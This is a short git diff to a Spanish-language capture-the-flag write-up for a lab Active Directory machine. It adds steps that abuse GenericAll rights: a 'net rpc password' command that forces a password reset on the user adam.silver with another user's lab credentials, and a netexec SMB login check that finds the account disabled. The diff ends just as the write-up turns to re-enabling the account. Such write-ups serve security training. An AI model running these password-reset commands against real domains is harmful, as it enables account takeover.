@@ -170,6 +170,12 @@ Viendo que formamos partes de `SENIOR DEVS@PUPPY.HTP` teniendo GenericAll(Contro
 
 #### Explotación GenericAll
 Para ver los métodos de explotación de este accedemos a Linux Abuse, igual que antes.
-Viendo que podemos formzar una cambio de contraseña 
+Viendo que podemos forzar una cambio de contraseña del usuario `ADAM`
+`net rpc password "adam.silver" "newP@ssword2022" -U "puppy.htb"/"ant.edwards"%'Antman2025!' -S $IP`
 
+Para confirmar si hemos cambiado la contraseña, ahora vamos a ver información sobre el usuario
+`netexec smb $IP -u 'adam.silver' -p 'newP@ssword2022'` 
+Nos muestra que la cuenta esta deshabilitada
+
+Para poder habilitar la cuenta podemos hacer lo siguiente:
 
